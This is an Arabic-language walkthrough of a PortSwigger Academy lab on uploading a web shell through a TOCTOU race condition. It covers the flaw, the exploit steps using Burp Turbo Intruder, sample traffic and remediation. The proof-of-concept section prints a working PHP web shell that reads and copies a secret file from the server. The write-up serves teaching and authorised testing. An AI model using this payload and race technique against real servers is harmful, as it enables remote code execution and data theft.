# Lab 07 — Web Shell Upload via Race Condition (استغلال السباق الزمني للتشغيل قبل الحذف)

[![التصنيف](https://img.shields.io/badge/الفئة-File%20Upload-indigo)]()
[![النوع](https://img.shields.io/badge/النوع-File%20Upload%20—%20TOCTOU%20Race%20Condition-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-حرج%20(Critical)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/file-upload)

> هذا الشرح جزء من سلسلة [معامل ثغرات رفع الملفات (File Upload)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 07 — Web Shell Upload via Race Condition (استغلال السباق الزمني للتشغيل قبل الحذف) |
| **تصنيف الثغرة** | File Upload — TOCTOU Race Condition |
| **معيار الضعف (CWE)** | CWE-367: Time-of-Check Time-of-Use (TOCTOU) Race Condition |
| **مستوى الخطورة** | حرج (Critical) |
| **الهدف من اللاب** | استغلال ثغرة سباق زمني لإرسال طلب تنفيذ الويب شل أثناء النافذة الزمنية بين حفظه وفحصه وحذفه. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

في هذا السيناريو، يقوم الكود بالتالي:
1. يستقبل الملف المرفوع ويحفظه فوراً على القرص في مجلد متاح على الويب: `/files/avatars/shell.php`.
2. يقوم بتشغيل برنامج فحص فيروسات وفحص امتدادات على الملف.
3. إذا تبين أن الملف خبيث أو لا يطابق الشروط، يقوم بحذفه من القرص ويظهر رسالة خطأ.

**الخلل الفكري القاتل (TOCTOU):**
بين لحظة كتابة الملف على القرص (الخطوة 1) ولحظة الانتهاء من الفحص وحذفه (الخطوة 3)، توجد **نافذة زمنية ضئيلة جداً (Race Window)** يكون فيها الملف الخبيث موجوداً بالفعل على القرص ومتاحاً للطلب عبر الـ HTTP!
إذا أرسلنا طلب رفع الملف، وفي نفس اللحظة بالتوازي أرسلنا مئات الطلبات السريعة لتشغيل `/files/avatars/shell.php`: سينجح أحد الطلبات في تشغيل الشل قبل أن يلحق السيرفر بحذفه!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يطلق هجوماً متزامناً (Parallel Requests) لطلب تشغيل الملف في الجزء من الثانية الفاصل بين حفظ الملف وحذفه.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
حفظ الملف في مسار تنفيذي عام قبل إتمام الفحص بدلاً من فحصه في مجلد مؤقت (Sandbox) معزول.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. سجل دخولك بحساب `wiener:peter`.
2. جهز ملف شل يقوم بإنشاء ملف جديد مستقل يحتوي على السر حتى لو تم حذفه هو:
```php
<?php file_put_contents('/home/carlos/stolen.txt', file_get_contents('/home/carlos/secret')); echo file_get_contents('/home/carlos/secret'); ?>
```
3. في Burp Suite، أرسل طلب الرفع `POST /my-account/avatar` إلى إضافة **Turbo Intruder**.
4. في Turbo Intruder، اضبط السكربت لإرسال طلب الرفع متبوعاً فوراً بطلب `GET /files/avatars/shell.php` بالتوازي عبر ميزة الـ Race Condition (Single-packet attack).
5. ابدأ الهجوم: ستلاحظ أن أحد طلبات الـ GET سيعيد كود `200 OK` بدلاً من `404 Not Found`!
6. افتح الرد الناجح وانسخ السر، وقدمه لحل اللاب بنجاح.

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
POST /my-account/avatar HTTP/1.1 (upload)
Followed in parallel by:
GET /files/avatars/shell.php HTTP/1.1
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK

(Executed during race window!)
Secret: 8d7c6b5a4f3e2...
```

---

## 6. الأثر الواقعي للثغرة (Impact)

تجاوز آليات الفحص المعتمدة على الفحص اللاحق وتشغيل كود خبيث على الخادم.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

عدم حفظ الملف في مساره النهائي أو العام إطلاقاً إلا بعد اجتياز الفحص بالكامل، واستخدام مجلد مؤقت آمن (`/tmp`) خارج نطاق خادم الويب.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — File Upload](https://portswigger.net/web-security/file-upload)
- [OWASP Top 10 — Vulnerabilities](https://owasp.org/)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
